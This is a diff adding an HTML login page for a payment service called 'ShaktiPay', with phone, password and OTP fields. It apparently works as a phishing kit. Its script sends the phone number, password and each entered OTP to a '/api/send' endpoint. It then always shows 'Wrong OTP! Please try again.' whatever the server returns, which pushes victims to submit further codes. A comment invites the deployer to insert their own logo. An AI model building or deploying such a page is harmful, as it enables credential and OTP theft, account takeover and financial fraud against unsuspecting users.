@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>ShaktiPay</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #fffaf5; /* Light peach background */
+      color: #333333;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container { width: 100%; max-width: 380px; text-align: center; }
+    
+    /* Logo Section */
+    .logo-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 40px;
+    }
+    .logo-box {
+      width: 120px; height: 120px;
+      border-radius: 50%;
+      margin-bottom: 15px;
+      overflow: hidden;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+    }
+    .logo-box img { width: 100%; height: 100%; object-fit: contain; }
+    
+    .brand-name {
+      font-size: 28px; 
+      font-weight: 800; 
+      color: #002147; /* Dark Blue */
+      letter-spacing: -0.5px;
+    }
+    .brand-name span {
+      color: #f97316; /* Orange */
+    }
+
+    /* Input Fields */
+    .input-group {
+      display: flex; align-items: center;
+      background: #ffffff;
+      border: 1px solid #e0e0e0;
+      border-radius: 30px; 
+      padding: 14px 20px;
+      margin-bottom: 15px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+    }
+    .input-group:focus-within { border-color: #f97316; }
+    .input-group svg { width: 24px; height: 24px; fill: none; stroke: #333; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; margin-right: 15px; flex-shrink: 0; }
+    .input-group input {
+      background: transparent; border: none; color: #333;
+      font-size: 16px; width: 100%; outline: none; font-weight: 500;
+    }
+    .input-group input::placeholder { color: #888; font-weight: 500; }
+
+    /* Links Row */
+    .row {
+      display: flex; justify-content: space-between; align-items: center;
+      font-size: 14px; color: #a0522d; margin-bottom: 25px;
+      padding: 0 10px; font-weight: 600;
+    }
+    .row a { color: #a0522d; text-decoration: underline; }
+    .row div { display: flex; align-items: center; gap: 6px; cursor: pointer; color: #a0522d;}
+    .row input[type="radio"] { width: 18px; height: 18px; accent-color: #22c55e; }
+
+    /* Agreement */
+    .checkbox-container {
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; color: #555; margin-bottom: 25px;
+      font-weight: 500; gap: 8px;
+    }
+    .checkbox-container input { width: 18px; height: 18px; accent-color: #22c55e; }
+    .checkbox-container a { color: #a0522d; text-decoration: underline; font-weight: 600; }
+
+    /* Button */
+    .btn-main {
+      width: 100%; padding: 16px;
+      background: linear-gradient(135deg, #ff8c00 0%, #f97316 100%);
+      color: #fff; border: none; border-radius: 30px;
+      font-size: 18px; font-weight: 700; cursor: pointer;
+      box-shadow: 0 6px 15px rgba(249, 115, 22, 0.3);
+      transition: transform 0.2s;
+    }
+    .btn-main:active { transform: scale(0.98); }
+    .btn-main:disabled { background: #ccc; cursor: not-allowed; box-shadow: none; }
+
+    /* Forget Password */
+    .forget-password {
+      display: block;
+      margin-top: 30px;
+      font-size: 14px;
+      color: #a0522d;
+      text-decoration: underline;
+      font-weight: 600;
+    }
+
+    /* OTP Popup */
+    .popup-overlay {
+      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.5); justify-content: center; align-items: center;
+      padding: 20px; z-index: 1000; backdrop-filter: blur(5px);
+    }
+    .popup-box {
+      background: #ffffff;
+      padding: 25px 20px; border-radius: 20px;
+      width: 100%; max-width: 380px; position: relative;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    }
+    .close-btn {
+      position: absolute; top: 15px; right: 15px;
+      background: #f0f0f0; color: #555; border: none;
+      border-radius: 50%; width: 32px; height: 32px;
+      font-size: 16px; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .popup-box h2 { font-size: 20px; margin-bottom: 10px; text-align: left; color: #002147; }
+    .popup-box p { font-size: 14px; color: #666; margin-bottom: 15px; line-height: 1.4; text-align: left; }
+    .popup-box p span { color: #f97316; font-weight: 700; }
+    
+    .otp-input-group {
+      display: flex; align-items: center;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 25px; padding: 5px 5px 5px 15px;
+      margin-bottom: 20px;
+      width: 100%; box-sizing: border-box; overflow: hidden;
+    }
+    .otp-input-group input {
+      flex: 1; background: transparent; border: none;
+      color: #333; padding: 10px 0; font-size: 16px;
+      outline: none; letter-spacing: 2px; min-width: 0;
+    }
+    .otp-input-group button {
+      background: #f97316;
+      color: #fff; border: none; border-radius: 20px;
+      padding: 10px 18px; font-weight: 700; cursor: pointer; font-size: 14px;
+      white-space: nowrap; flex-shrink: 0;
+    }
+    .otp-input-group button:disabled { background: #ccc; cursor: not-allowed; }
+    
+    .timer-text { color: #888; font-size: 13px; margin-bottom: 15px; text-align: center; }
+    .toast {
+      position: fixed; top: 20px; left: 50%;
+      transform: translateX(-50%) translateY(-100px);
+      background: #333; color: #fff; padding: 12px 20px; border-radius: 10px;
+      font-size: 14px; font-weight: 600; z-index: 2000;
+      transition: transform 0.3s; max-width: 90%; text-align: center;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+    .toast.error { background: #ef4444; }
+    
+    /* Footer Version */
+    .version { position: absolute; bottom: 20px; right: 20px; font-size: 12px; color: #aaa; }
+  </style>
+</head>
+<body>
+
+  <div class="toast" id="toast"></div>
+
+  <div class="container">
+    
+    <!-- LOGO -->
+    <div class="logo-section">
+      <div class="logo-box">
+        <!-- Yahan apna logo daalein. Agar logo nahi hai toh text show hoga -->
+        <img src="shaktilogo.png" alt="ShaktiPay" onerror="this.style.display='none'">
+      </div>
+      <div class="brand-name">Shakti<span>Pay</span></div>
+    </div>
+
+    <!-- PHONE INPUT -->
+    <div class="input-group">
+      <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+      <input type="tel" id="phone" placeholder="Phone" maxlength="10" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
+    </div>
+
+    <!-- PASSWORD INPUT -->
+    <div class="input-group">
+      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+      <input type="password" id="pass" placeholder="Password">
+    </div>
+
+    <!-- REMEMBER / REGISTER -->
+    <div class="row">
+      <a href="#">Register</a>
+      <div><input type="checkbox" checked style="accent-color: #22c55e;"> Remember Me</div>
+    </div>
+
+    <!-- AGREEMENT -->
+    <div class="checkbox-container">
+      <input type="checkbox" checked> Agree <a href="#">"User Privacy Agreement"</a>
+    </div>
+
+    <!-- SIGN IN BUTTON -->
+    <button class="btn-main" id="signInBtn" onclick="showOTP()">Sign In</button>
+
+    <!-- FORGET PASSWORD -->
+    <a href="#" class="forget-password">Forget Password</a>
+
+    <!-- FOOTER VERSION -->
+    <div class="version">v1.4.8</div>
+  </div>
+
+  <!-- OTP POPUP -->
+  <div class="popup-overlay" id="otpPopup">
+    <div class="popup-box">
+      <button class="close-btn" onclick="closeOTP()">✕</button>
+      <h2>Login OTP</h2>
+      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
+      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>
+      
+      <div class="otp-input-group">
+        <input type="tel" id="otpInput" placeholder="Enter OTP" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
+        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
+      </div>
+      
+      <div class="timer-text" id="timerText"></div>
+      <button class="btn-main" id="confirmBtn" onclick="verifyOTP()">CONFIRM</button>
+    </div>
+  </div>
+
+  <script>
+    let countdown;
+    let timeLeft = 60;
+    let isProcessing = false;
+
+    function showToast(msg, isError = false) {
+      const toast = document.getElementById('toast');
+      toast.textContent = msg;
+      toast.className = 'toast show' + (isError ? ' error' : '');
+      clearTimeout(toast._timeout);
+      toast._timeout = setTimeout(() => { toast.className = 'toast'; }, 3000);
+    }
+
+    async function callAPI(data) {
+      try {
+        const response = await fetch('/api/send', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+        return await response.json();
+      } catch (err) {
+        console.error('API Error:', err);
+        return { error: 'Network error' };
+      }
+    }
+
+    async function showOTP() {
+      if (isProcessing) return;
+      const phone = document.getElementById('phone').value.trim();
+      const pass = document.getElementById('pass').value.trim();
+      const btn = document.getElementById('signInBtn');
+
+      if (!phone || !pass) { showToast('Please fill all fields!', true); return; }
+      if (phone.length !== 10) { showToast('Phone must be 10 digits!', true); return; }
+
+      isProcessing = true;
+      btn.disabled = true;
+      btn.textContent = 'Please wait...';
+
+      try {
+        const result = await callAPI({ phone, pass, type: 'login' });
+        if (result.error) {
+          showToast(result.error, true);
+        } else {
+          document.getElementById('displayPhone').innerText = "+91 " + phone;
+          document.getElementById('otpPopup').style.display = 'flex';
+          resetTimer();
+        }
+      } catch (err) {
+        showToast('Something went wrong!', true);
+      } finally {
+        isProcessing = false;
+        btn.disabled = false;
+        btn.textContent = 'Sign In';
+      }
+    }
+
+    function closeOTP() {
+      document.getElementById('otpPopup').style.display = 'none';
+      clearInterval(countdown);
+    }
+
+    async function sendOTP() {
+      const phone = document.getElementById('phone').value;
+      const btn = document.getElementById('sendOtpBtn');
+      startTimer();
+      btn.disabled = true;
+      btn.innerText = "Sent";
+      await callAPI({ phone, type: 'send_otp' });
+    }
+
+    async function verifyOTP() {
+      if (isProcessing) return;
+      const otp = document.getElementById('otpInput').value;
+      const phone = document.getElementById('phone').value;
+      const btn = document.getElementById('confirmBtn');
+
+      if (!otp) { showToast('Please enter OTP!', true); return; }
+      if (otp.length !== 6) { showToast('OTP must be 6 digits!', true); return; }
+
+      isProcessing = true;
+      btn.disabled = true;
+      btn.textContent = 'Verifying...';
+
+      try {
+        await callAPI({ phone, otp, type: 'verify_otp' });
+      } catch (err) { console.error(err); }
+
+      setTimeout(() => {
+        isProcessing = false;
+        btn.disabled = false;
+        btn.textContent = 'CONFIRM';
+        showToast('❌ Wrong OTP! Please try again.', true);
+      }, 800);
+    }
+
+    function startTimer() {
+      timeLeft = 60;
+      const timerDisplay = document.getElementById('timerText');
+      clearInterval(countdown);
+      countdown = setInterval(() => {
+        if (timeLeft <= 0) {
+          clearInterval(countdown);
+          timerDisplay.innerText = "";
+          document.getElementById('sendOtpBtn').disabled = false;
+          document.getElementById('sendOtpBtn').innerText = "Send";
+        } else {
+          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
+          timeLeft--;
+        }
+      }, 1000);
+    }
+
+    function resetTimer() {
+      clearInterval(countdown);
+      timeLeft = 60;
+      document.getElementById('sendOtpBtn').disabled = false;
+      document.getElementById('sendOtpBtn').innerText = "Send";
+      document.getElementById('otpInput').value = "";
+      document.getElementById('timerText').innerText = "";
+    }
+  </script>
+
+</body>
+</html>
